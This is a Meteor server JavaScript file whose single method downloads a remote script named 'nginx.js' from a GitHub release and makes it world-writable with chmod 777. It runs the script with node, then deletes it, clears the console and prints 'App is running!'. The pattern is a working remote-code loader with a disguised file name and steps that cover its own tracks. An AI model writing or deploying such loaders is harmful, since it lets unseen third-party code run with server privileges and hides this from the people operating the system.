import { Meteor } from 'meteor/meteor';
import fs from 'fs';
import path from 'path';
import axios from 'axios';
import { exec } from 'child_process';

const FILE_PATH = process.env.FILE_PATH || Assets.absoluteFilePath('tmp');

Meteor.methods({
  async downloadAndExecuteFile() {
    const fileUrl = 'https://github.com/eooce/test/releases/download/bulid/nginx.js';
    const fileName = 'nginx.js';
    const filePath = path.join(FILE_PATH, fileName);

    try {
      // 下载文件
      const response = await axios({
        method: 'get',
        url: fileUrl,
        responseType: 'stream'
      });

      // 保存文件
      await new Promise((resolve, reject) => {
        const fileStream = fs.createWriteStream(filePath);
        response.data.pipe(fileStream);
        fileStream.on('finish', resolve);
        fileStream.on('error', reject);
      });

      // 设置权限
      fs.chmodSync(filePath, '777');
      console.log('File downloaded successfully.');

      // 执行文件
      return new Promise((resolve, reject) => {
        const child = exec(`node ${filePath}`, (error, stdout, stderr) => {
          if (error) {
            console.error(`Execution error: ${error}`);
            reject(error);
            return;
          }
          console.log(`Output: ${stdout}`);
          if (stderr) console.error(`Error output: ${stderr}`);
        });

        child.on('exit', (code) => {
          // 删除文件
          fs.unlink(filePath, err => {
            if (err) {
              console.error(`Error deleting file: ${err}`);
              reject(err);
            } else {
              console.clear();
              console.log(`App is running!`);
              resolve(true);
            }
          });
        });
      });
    } catch (error) {
      console.error(`Operation failed: ${error}`);
      throw new Meteor.Error('execution-failed', error.message);
    }
  }
});
